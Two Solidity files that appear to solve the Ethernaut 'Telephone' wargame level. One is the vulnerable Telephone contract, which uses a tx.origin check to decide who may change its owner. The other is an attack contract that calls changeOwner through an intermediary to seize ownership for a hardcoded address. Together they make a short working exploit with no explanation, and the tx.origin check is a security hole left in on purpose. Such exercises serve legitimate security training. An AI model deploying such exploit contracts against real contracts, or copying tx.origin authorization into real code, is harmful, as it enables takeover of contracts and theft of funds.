// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Telephone.sol';

contract CompositeCall {

  Telephone public telephone;

  constructor() public {
    telephone = Telephone(0xcb198959186870cfC5531935E09D534f1928C2Ce);
  }

  function call() public {
      telephone.changeOwner(0x0B27aeb5c4CB8007661bB79BFF4A62a7B0640Fe4);
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}